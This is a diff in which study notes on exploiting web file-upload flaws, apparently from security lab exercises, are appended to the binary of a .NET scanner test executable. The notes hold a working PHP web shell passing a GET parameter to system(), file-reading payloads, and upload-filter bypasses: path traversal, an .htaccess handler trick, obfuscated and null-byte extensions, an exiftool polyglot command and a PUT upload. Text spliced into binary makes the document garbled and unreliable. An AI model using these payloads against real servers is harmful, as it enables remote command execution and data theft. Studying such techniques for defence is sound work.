@@ -12,3 +12,48 @@ $       PE  L `m?V        ?            '       @    @               
            
        g `  ~ ~  ? ?  ? ?  ? ?  ?  /?  H?  c?  ~?  ?- ?- ??  ??  . N ?`               " 4    P     ' n 
   \     ?s      y  s   s  ! s  ) s  1 s  9 s  A s  I s  Q s  Y s  a s  i s  q s  y s  ? s  ? ^# 	 s  .  ( .  v .  ? . # ? . + ? . 3 v . ; . . C ? . S ? . [ ? . k ? . s ? . { ? ?               l              W          <Module> ConsoleApplication1.exe FileUploadExeTest WebInspectDangerousFileUploadCheck mscorlib System Object Main .ctor args System.Runtime.Versioning TargetFrameworkAttribute System.Reflection AssemblyTitleAttribute AssemblyDescriptionAttribute AssemblyConfigurationAttribute AssemblyCompanyAttribute AssemblyProductAttribute AssemblyCopyrightAttribute AssemblyTrademarkAttribute AssemblyCultureAttribute System.Runtime.InteropServices ComVisibleAttribute GuidAttribute AssemblyVersionAttribute AssemblyFileVersionAttribute System.Runtime.CompilerServices CompilationRelaxationsAttribute RuntimeCompatibilityAttribute ConsoleApplication1 Console WriteLine    kW e b I n s p e c t   G e n e r a t e d   D a n g e r o u s   F i l e   U p l o a d   C h e c k   F i l e     ?+bNj?K???x]? ?z\V4??       M .NETFramework,Version=v4.5.2 TFrameworkDisplayName.NET Framework 4.5.2 ConsoleApplication1       Copyright ©  2016  ) $10fc66dc-7c19-42fe-8667-24daced6edf7   1.0.0.0          TWrapNonExceptionThrows?&          ?&                          ?&            _CorExeMain mscoree.dll     ?%  @                                                                                                                                                                                                                                                                 ?                  0  ?                   H   X@              4   V S _ V E R S I O N _ I N F O     ???                 ?                         D    V a r F i l e I n f o     $    T r a n s l a t i o n       ?`   S t r i n g F i l e I n f o   <   0 0 0 0 0 4 b 0   P   F i l e D e s c r i p t i o n     C o n s o l e A p p l i c a t i o n 1   0   F i l e V e r s i o n     1 . 0 . 0 . 0   P   I n t e r n a l N a m e   C o n s o l e A p p l i c a t i o n 1 . e x e   H   L e g a l C o p y r i g h t   C o p y r i g h t   ?     2 0 1 6   X   O r i g i n a l F i l e n a m e   C o n s o l e A p p l i c a t i o n 1 . e x e   H   P r o d u c t N a m e     C o n s o l e A p p l i c a t i o n 1   4   P r o d u c t V e r s i o n   1 . 0 . 0 . 0   8   A s s e m b l y   V e r s i o n   1 . 0 . 0 . 0                                                                                                                                                                                  7
+A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.
+
+<?php echo file_get_contents('/path/to/target/file'); ?>
+<?php echo system($_GET['command']); ?>
+GET /example/exploit.php?command=id HTTP/1.1
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+GET /files/avatars/exploit.php HTTP/1.1
+
+Content-Type restriction bypass --> hange the specified Content-Type to image/jpeg
+
+Path Traversal:
+Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
+filename="..%2fexploit.php"
+GET /files/avatars/..%2fexploit.php
+GET /files/exploit.php
+
+Extension Blacklist bypass:
+Change the value of the filename parameter to .htaccess
+Change the value of the Content-Type header to text/plain
+Replace the contents of the file (your PHP payload) with the following Apache directive: AddType application/x-httpd-php .l33t
+This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php
+Change the value of the filename parameter from exploit.php to exploit.l33t
+
+Obfuscating file extensions:
+exploit.pHp
+exploit.php.jpg
+exploit.php.
+exploit%2Ephp
+exploit.asp;.jpg
+exploit.asp%00.jpg
+defenses involve stripping or replacing dangerous extensions --> exploit.p.phphp
+
+Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
+Uploading files using PUT:
+PUT /images/exploit.php HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
+
+<?php echo file_get_contents('/path/to/file'); ?>
+
+can try sending OPTIONS requests to different endpoints to test for any that advertise support for the PUT method
